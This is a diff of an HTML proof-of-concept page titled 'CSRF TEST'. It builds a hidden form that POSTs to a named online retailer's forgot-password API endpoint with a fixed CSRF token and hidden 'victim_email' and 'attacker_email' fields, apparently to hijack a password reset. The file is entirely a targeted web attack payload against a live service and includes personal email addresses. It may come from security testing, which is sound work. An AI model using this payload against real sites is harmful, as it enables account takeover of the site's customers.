@@ -1,29 +1,14 @@
-
- <html>
- 
-
-  <body>
- 
-
-    <form action="https://boozt.com/eu/en/api/customer/forgot-password" method="POST">
- 
-
-      <input type="hidden" name="email" value="iqbalup@gmail.com">
- 
-
-      <input type="hidden" name="csrf_token" value="e6fc399fa932694886f7e25a1495111f">
- 
-
-      <button type="button">Submit</button>
- 
-
-    </form>
- 
-
-
- 
-
-  </body>
- 
-
+<!DOCTYPE html>
+<html>
+<head>
+   <title>CSRF TEST</title>
+</head>
+<body>
+<form action="https://boozt.com/eu/en/api/customer/forgot-password" method="POST">
+    <input type="hidden" name="csrf_token" value="e6fc399fa932694886f7e25a1495111f">
+    <input type="hidden" name="victim_email" value="isayev6115@gmail.com">
+    <input type="hidden" name="attacker_email" value="iqbalup18@gmail.com">
+    <input type="submit" value="Submit">
+</form>
+</body>
 </html>
